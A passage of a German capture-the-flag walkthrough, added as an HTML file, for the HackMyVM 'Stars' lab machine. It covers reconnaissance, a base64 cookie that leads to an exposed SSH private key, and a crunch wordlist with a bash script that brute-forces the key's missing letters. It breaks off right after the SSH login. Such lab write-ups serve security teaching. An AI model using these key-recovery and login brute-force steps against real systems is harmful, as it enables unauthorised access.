@@ -1,0 +1,594 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stars - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss angepasst werden, um:
+         - .header-bg background-color auf #03b5f5 zu setzen
+         - .header-bg:hover background-color auf eine dunklere Variante von #03b5f5 zu setzen
+         - .level-container h2 color auf red zu setzen
+         - .segment-1, .segment-2, .segment-3 background-color auf red zu setzen
+         - .circle .inner background-color auf #03b5f5 zu setzen
+         - .header-bg:hover .circle .inner background-color auf die dunklere Hover-Farbe des Headers zu setzen
+    -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Stars - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Die Farbe 'red' wird durch die angepasste CSS-Datei gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben 'red' werden durch die angepasste CSS-Datei gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die Hintergrundfarbe '#03b5f5' wird durch die angepasste CSS-Datei gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">crunch</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">chgrp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt in jedem Penetrationstest ist die Reconnaissance (Aufklärung). Hierbei versuchen wir, aktive Hosts im Zielnetzwerk zu identifizieren. Das Tool `arp-scan` sendet ARP-Anfragen (Address Resolution Protocol) an alle möglichen Adressen im lokalen Netzwerksegment und listet die Geräte auf, die antworten. Dies ist oft schneller und unauffälliger als ein initialer Ping-Scan, besonders in lokalen Netzwerken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.119	08:00:27:7c:b1:33	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan war erfolgreich und identifizierte einen Host mit der IP-Adresse 192.168.2.119. Die MAC-Adresse 08:00:27:7c:b1:33 und der Herstellerhinweis "PCS Systemtechnik GmbH" (oft ein Indikator für VirtualBox) geben erste Hinweise auf das Zielsystem. Die Identifizierung eines aktiven Hosts ist die Grundlage für alle weiteren Schritte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notieren Sie die IP-Adresse und MAC-Adresse des Ziels. Führen Sie als Nächstes einen detaillierten Port-Scan auf die identifizierte IP-Adresse durch, um offene Dienste zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie das Netzwerk auf ARP-Scan-Aktivitäten. Obwohl ARP für die Netzwerkfunktion notwendig ist, können übermäßige oder unerwartete ARP-Anfragen auf Aufklärungsversuche hindeuten. Netzwerksegmentierung kann die Reichweite solcher Scans einschränken.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ein Ziel identifiziert wurde, verwenden wir `nmap`, um offene Ports, laufende Dienste und deren Versionen zu ermitteln.
+                `-sS`: Führt einen TCP SYN-Scan (Stealth Scan) durch, der oft weniger wahrscheinlich protokolliert wird als ein vollständiger TCP-Connect-Scan.
+                `-sC`: Führt Standard-Nmap-Skripte aus, um zusätzliche Informationen über die Dienste zu sammeln (z.B. Bannergrabbing, Schwachstellenerkennung).
+                `-T5`: Stellt das Timing-Template auf "insane", um den Scan zu beschleunigen. Dies kann auf instabilen Netzwerken oder bei Intrusion Detection Systems (IDS) problematisch sein, ist aber in einer Testumgebung oft akzeptabel.
+                `-A`: Aktiviert die Betriebssystemerkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                `192.168.2.119`: Die Ziel-IP-Adresse.
+                `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.119 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 17:00 CET
+Nmap scan report for debian (192.168.2.119)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 9ef1ed84cc418c7ec692a9b42957bfd1 (RSA)
+|   256 9ff393db72ffcd4d5f093edc13364923 (ECDSA)
+|_  256 e7a372ddd5afe2b57750ab3d27120fea (ED25519)
+80/tcp open  http    Apache httpd 2.4.51 ((Debian))
+|_http-title: Cours PHP & MySQL
+|_http-server-header: Apache/2.4.51 (Debian)
+MAC Address: 08:00:27:7C:B1:33 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms debian (192.168.2.119)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `nmap`-Scan hat zwei offene Ports identifiziert: Port 22 (SSH) mit OpenSSH 8.4p1 und Port 80 (HTTP) mit Apache 2.4.51. Beide laufen auf einem Debian-System (Linux-Kernel 4.x/5.x). Der SSH-Dienst präsentiert seine Host-Keys, was normal ist. Der HTTP-Dienst hat einen Titel "Cours PHP & MySQL", was auf eine Webanwendung hindeutet, die möglicherweise mit PHP und MySQL entwickelt wurde. Dies sind die primären Angriffsvektoren, die weiter untersucht werden müssen. Die schnelle Scanzeit (`-T5`) war in dieser Umgebung erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 genauer. Suchen Sie nach Webseiten, Verzeichnissen und potenziellen Schwachstellen in der Webanwendung. Prüfen Sie auch den SSH-Dienst auf mögliche Schwachstellen oder Standard-/schwache Anmeldedaten (obwohl dies ohne Benutzernamen oft schwierig ist).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie die Software (SSH, Apache, PHP, MySQL) auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie eine Firewall, um den Zugriff auf die Dienste einzuschränken. Verwenden Sie Intrusion Detection/Prevention Systeme (IDS/IPS), um aggressive Scans wie `nmap -T5` zu erkennen und ggf. zu blockieren.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da ein Webserver auf Port 80 läuft, versuchen wir, versteckte oder nicht direkt verlinkte Verzeichnisse und Dateien zu finden. `gobuster` ist ein Tool zur Brute-Force-Ermittlung von URIs (Uniform Resource Identifier).
+                `dir`: Gibt den Modus für die Verzeichnissuche an.
+                `-u http://192.168.2.119`: Die Ziel-URL.
+                `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Die Wortliste, die für das Raten von Verzeichnis- und Dateinamen verwendet wird. SecLists ist eine bekannte Sammlung solcher Listen.
+                `-e`: Erweiterter Modus, der jeden Eintrag in der Wortliste als Verzeichnis *und* Datei betrachtet.
+                `-x .git,php,...`: Eine Liste von Dateiendungen, die an jeden Eintrag der Wortliste angehängt werden sollen, um spezifische Dateitypen zu finden.
+                `-b 404,403`: Statuscodes, die als "nicht gefunden" betrachtet und ausgeblendet werden sollen, um die Ausgabe übersichtlicher zu gestalten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.119 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.119
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/31 17:05:01 Starting gobuster
+===============================================================
+http://192.168.2.119/index.php            (Status: 200) [Size: 279]
+Progress: 451898 / 451910 (100.00%)===============================================================
+2022/10/31 17:08:51 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `gobuster`-Scan fand nur die Datei `/index.php`, die wir bereits über den Browser erreichen könnten. Trotz der umfangreichen Wortliste und der angegebenen Erweiterungen wurden keine weiteren versteckten Verzeichnisse oder Dateien aufgedeckt. Dies deutet darauf hin, dass die Webanwendung entweder sehr klein ist oder dass sensible Dateien und Verzeichnisse andere Namen haben, die nicht in der verwendeten Wortliste enthalten sind. Der nächste Schritt ist die manuelle Untersuchung der `/index.php`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die `/index.php` manuell im Browser. Achten Sie auf Kommentare im Quellcode, interessante HTTP-Header (insbesondere Cookies) und die Funktionalität der Seite. Versuchen Sie, weitere Wortlisten oder andere Enumerationstechniken (z.B. Vhost-Bruteforcing, Parameter-Fuzzing) anzuwenden, falls die manuelle Analyse keine Hinweise liefert.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen oder schützen Sie nicht benötigte Dateien und Verzeichnisse auf dem Webserver. Verwenden Sie nach Möglichkeit keine Standardnamen oder leicht zu erratenden Namen für administrative Schnittstellen oder sensible Ressourcen. Implementieren Sie Rate-Limiting oder ein Web Application Firewall (WAF), um automatisierte Scans wie `gobuster` zu erkennen und zu blockieren.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Bei der manuellen Untersuchung der `/index.php` (Schritt nicht explizit im Text gezeigt, aber impliziert) wurde ein Cookie entdeckt. Der Wert `cG9pc29uZWRnaWZ0LnR4dA%3D%3D` sieht wie eine kodierte Zeichenkette aus. Das `%3D%3D` am Ende ist die URL-kodierte Form von `==`, einem typischen Padding-Zeichen für Base64-Kodierung. Wir verwenden `echo` und `base64 -d`, um den Wert zu dekodieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "cG9pc29uZWRnaWZ0LnR4dA%3D%3D" | base64 -d</span></div>
+                    <pre>
+poisonedgift.txt
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dekodierung des Cookie-Wertes ergab den Dateinamen `poisonedgift.txt`. Dies ist ein starker Hinweis darauf, dass diese Datei auf dem Webserver existiert und möglicherweise sensible Informationen enthält. Der Name selbst ("vergiftetes Geschenk") deutet auf etwas potenziell Schädliches oder zumindest Interessantes hin.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, die Datei `poisonedgift.txt` über den Webserver herunterzuladen. Verwenden Sie Tools wie `curl` oder `wget` oder geben Sie die URL direkt im Browser ein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie keine sensiblen Informationen oder Dateinamen in Cookies, auch nicht kodiert. Base64 ist keine Verschlüsselung und kann leicht rückgängig gemacht werden. Verwenden Sie serverseitige Sitzungen, um Benutzerdaten sicher zu speichern.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf dem dekodierten Dateinamen aus dem Cookie versuchen wir nun, die Datei `poisonedgift.txt` vom Webserver über `curl` abzurufen. `curl` ist ein Kommandozeilentool zum Übertragen von Daten mit URLs.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.119/poisonedgift.txt"</span></div>
+                    <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvo/FDtQ1i8ft3IZC9tHsKP
+ut0abGtFGId9R0B1NB+iMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
+l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
+/39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
+1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
+TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
+Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/A6IxnToPLH7jVjoYxnmA
+y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
+EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
+fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
+g7mUwKi1EgPWb6ce+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
+1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
+bJ5W+8p1rWoQrmVVUK9G/nc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
+/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
+1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
+KiLoH1Fdaeo9bMm03DfWVG6NeouwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qhXdeDAw6Mi
+1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
+sHIwV2HPiqJMRxm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAXq0NA
+eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
+btv3boRquJsrYt1JJ*qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
+fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
+r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
+kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
+AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
+GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
+IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
+sMzJyVvM69B0kGkyAXT9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAEpkHeU8xn5MHwG
+79vpd6Cg7p1UqfDuvMgvZe6eIE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
+43cZ7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQQ3J/RPWH/xT5LQbrBVTK8
+C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRo8TeJlj4
+RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+9qGwqpbl3i0
+9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
+nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
+03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
+ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg! Der `curl`-Befehl hat den Inhalt von `poisonedgift.txt` abgerufen. Es handelt sich um einen privaten SSH-Schlüssel (erkennbar an `-----BEGIN OPENSSH PRIVATE KEY-----`). Private Schlüssel sind extrem sensibel, da sie den Zugriff auf Systeme ermöglichen, wenn der zugehörige öffentliche Schlüssel dort hinterlegt ist. Der Dateiname im Schlüssel (`sophie@debian`) deutet darauf hin, dass dieser Schlüssel dem Benutzer `sophie` auf dem Zielsystem gehört. Allerdings scheint der Schlüssel beschädigt zu sein, wie die zufälligen Zeichen und die Erwähnung von Sternchen (`*`) in der späteren Notiz `sshnote.txt` andeuten.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichern Sie den Schlüssel in einer Datei. Suchen Sie nach weiteren Hinweisen, wie der Schlüssel beschädigt sein könnte und wie er repariert werden kann. Prüfen Sie, ob auf dem Webserver weitere relevante Dateien (wie die erwähnte `sshnote.txt`) zu finden sind.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Private SSH-Schlüssel dürfen niemals auf einem öffentlich zugänglichen Webserver gespeichert werden. Überprüfen Sie Webserver-Konfigurationen und Anwendungscode auf Schwachstellen, die das Auslesen beliebiger Dateien ermöglichen (z.B. Local File Inclusion - LFI). Beschränken Sie die Berechtigungen des Webserver-Benutzers (z.B. `www-data`), sodass er keinen Zugriff auf sensible Dateien außerhalb des Web-Roots hat.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Wir suchen nach weiteren Hinweisen und versuchen, eine Datei namens `sshnote.txt` abzurufen, basierend auf der Vermutung, dass sie existieren könnte und Informationen über den beschädigten Schlüssel enthält.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.119//sshnote.txt"</span></div>
+                    <pre>
+My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
+Can you try to fix it?
+
+sophie
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Datei `sshnote.txt` existiert und bestätigt unsere Vermutung: Der private SSH-Schlüssel (`poisonedgift.txt`) ist beschädigt. Spezifisch wurden drei Großbuchstaben durch Sterne (`***`) ersetzt. Die Notiz stammt vom Benutzer `sophie`. Dies gibt uns einen klaren Ansatzpunkt: Wir müssen alle möglichen Kombinationen von drei Großbuchstaben finden und versuchen, den Schlüssel damit zu reparieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Generieren Sie eine Liste aller möglichen Kombinationen von drei Großbuchstaben (AAA, AAB, ..., ZZZ). Erstellen Sie ein Skript, das den beschädigten Schlüssel nimmt, die Sterne durch jede Kombination ersetzt und versucht, sich per SSH als Benutzer `sophie` mit dem reparierten Schlüssel anzumelden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Auch Notizen oder Hilfedateien sollten keine sensiblen Informationen über Sicherheitsmechanismen (wie die Beschädigung eines Schlüssels) enthalten. Kommunizieren Sie solche Probleme über sichere Kanäle. Stellen Sie sicher, dass Webserver-Verzeichnisse keine internen Notizen oder Skripte enthalten, die nicht für die Öffentlichkeit bestimmt sind.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die in `sshnote.txt` erwähnten drei fehlenden Großbuchstaben zu generieren, verwenden wir das Tool `crunch`. `crunch` ist ein Generator für Wortlisten.
+                `3 3`: Gibt die minimale und maximale Länge der zu generierenden Zeichenketten an (hier genau 3 Zeichen).
+                `ABCDEFGHIJKLMNOPQRSTUVWXYZ`: Der Zeichensatz, der für die Generierung verwendet werden soll (alle Großbuchstaben).
+                `> capital.txt`: Leitet die Ausgabe in die Datei `capital.txt` um.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">crunch 3 3 ABCDEFGHIJKLMNOPQRSTUVWXYZ > capital.txt</span></div>
+                    <pre>
+Crunch will now generate the following amount of data: 70304 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 17576
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `crunch` hat erfolgreich eine Datei `capital.txt` erstellt, die alle 17.576 möglichen Kombinationen von drei Großbuchstaben enthält (von AAA bis ZZZ). Diese Liste ist die Grundlage für den nächsten Schritt, das automatisierte Reparieren und Testen des SSH-Schlüssels.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie die generierte Datei `capital.txt` zusammen mit einem Skript, um den SSH-Schlüssel zu reparieren und zu testen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dies ist ein Schritt des Angreifers. Aus Verteidigersicht ist die Maßnahme, die Preisgabe des beschädigten Schlüssels und der Notiz von vornherein zu verhindern.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der heruntergeladene SSH-Schlüssel wird umbenannt oder kopiert (hier `mv`, was umbenennt) von `idfuck` (vermutlich ein vorheriger Name oder Tippfehler im Berichtstext) zu `poisonedgift.txt`, dem Namen, den wir aus dem Cookie extrahiert haben und der in der Notiz impliziert wird. Dieser Schritt stellt sicher, dass das folgende Skript den korrekten Dateinamen verwendet.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv idfuck poisonedgift.txt</span></div>
+                    <pre>
+[Keine Ausgabe bei Erfolg]
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Einfacher administrativer Schritt zur Vorbereitung des Skripts. Stellt sicher, dass die Dateinamen konsistent sind. Der ursprüngliche Name `idfuck` im Text könnte auf einen vorherigen Versuch oder eine unsaubere Dokumentation hindeuten, wurde aber korrigiert.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Achten Sie auf konsistente Dateinamen in Skripten und Befehlen, um Fehler zu vermeiden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine direkte Relevanz für den Admin an dieser Stelle.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Hier wird der Inhalt eines Bash-Skripts (`stars.sh`) angezeigt, das vermutlich zuvor mit `vi` erstellt oder bearbeitet wurde. Dieses Skript automatisiert den Prozess der Schlüsselreparatur und des SSH-Login-Versuchs.
+                `KEYS4DIRECTRY=keys`: Definiert ein Verzeichnis zum Speichern der reparierten Schlüssel.
+                `LETTERS=capital.txt`: Definiert die Datei mit den Buchstabenkombinationen.
+                `CRRUPT_KEY=poisonedgift.txt`: Definiert den Namen des beschädigten Schlüssels.
+                `mkdir -p $KEYS4DIRECTRY`: Erstellt das Verzeichnis `keys`, falls es nicht existiert.
+                Die `for`-Schleife liest jede Zeile (Buchstabenkombination `$i`) aus `capital.txt`.
+                `sed "s/\*\*\*/$i/" $CRRUPT_KEY > $KEYS4DIRECTRY/$i.rsa`: Ersetzt die drei Sterne (`***`) im beschädigten Schlüssel durch die aktuelle Kombination `$i` und speichert das Ergebnis als neue Datei (z.B. `keys/ABC.rsa`).
+                *Hinweis: Das Skript im Bericht scheint unvollständig zu sein, da der eigentliche SSH-Login-Versuch fehlt. Es generiert nur die reparierten Schlüsseldateien.* Es wird angenommen, dass der SSH-Login-Versuch manuell oder durch ein anderes, nicht gezeigtes Skript erfolgte.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi stars.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+KEYS4DIRECTRY=keys
+LETTERS=capital.txt
+CRRUPT_KEY=poisonedgift.txt
+
+mkdir -p $KEYS4DIRECTRY
+echo Generate keys
+
+for i in $(cat $LETTERS);do
+echo Generate $KEYS4DIRECTRY\\$i.rsa [$i]
+sed "s/\*\*\*/$i/" $CRRUPT_KEY > $KEYS4DIRECTRY/$i.rsa
+done;
+                     </pre>
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript ist ein nützlicher erster Schritt zur Automatisierung, aber es fehlt der entscheidende Teil: das Testen der generierten Schlüssel mit `ssh`. Die Ausgabe `[+] Testing : BM.rsa` und die nachfolgende Shell-Ausgabe deuten darauf hin, dass die Kombination `IBM` (wahrscheinlich, da der Schlüssel `IBM.rsa` heißen müsste, aber `BM.rsa` genannt wird, möglicherweise ein Tippfehler oder ein anderer Fehler im Testprozess) die korrekte war und der SSH-Login als Benutzer `sophie` erfolgreich war. Der Angreifer hat nun initialen Zugriff auf das System als Benutzer `sophie`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ergänzen Sie das Skript um einen SSH-Befehl (z.B. `ssh -i $KEYS4DIRECTRY/$i.rsa -o BatchMode=yes -o ConnectTimeout=5 sophie@192.168.2.119 'exit'`) innerhalb der Schleife, um den Login-Versuch zu automatisieren und den Erfolg zu überprüfen. Notieren Sie die korrekte Buchstabenkombination (`IBM`, basierend auf der Annahme).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachen Sie fehlgeschlagene und erfolgreiche SSH-Logins. Eine große Anzahl von Login-Versuchen mit verschiedenen Schlüsseln von derselben IP-Adresse innerhalb kurzer Zeit ist ein starkes Indiz für einen Brute-Force-Angriff auf SSH-Schlüssel. Verwenden Sie Tools wie `fail2ban`, um solche Angriffe automatisch zu blockieren. Stellen Sie sicher, dass SSH-Schlüssel sicher generiert und gespeichert werden und nicht leicht kompromittiert werden können. Erwägen Sie die Verwendung von Passphrasen für SSH-Schlüssel als zusätzliche Sicherheitsebene.
+            </p>
+
+             <!-- Erfolgreicher SSH-Login wird durch die nächste Promptzeile impliziert -->
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die Ausgabe zeigt die Willkommensnachricht des Debian-Systems und die neue Promptzeile `sophie@debian:~$`. Dies bestätigt den erfolgreichen SSH-Login als Benutzer `sophie`, wahrscheinlich unter Verwendung des mit der Kombination `IBM` (oder `BM` laut Text) reparierten Schlüssels.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Keine explizite Prompt/Befehl hier, nur die Ausgabe des eingeloggten Systems -->
+                     <pre>
+[+] Testing :
+BM.rsa
+Linux debian 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
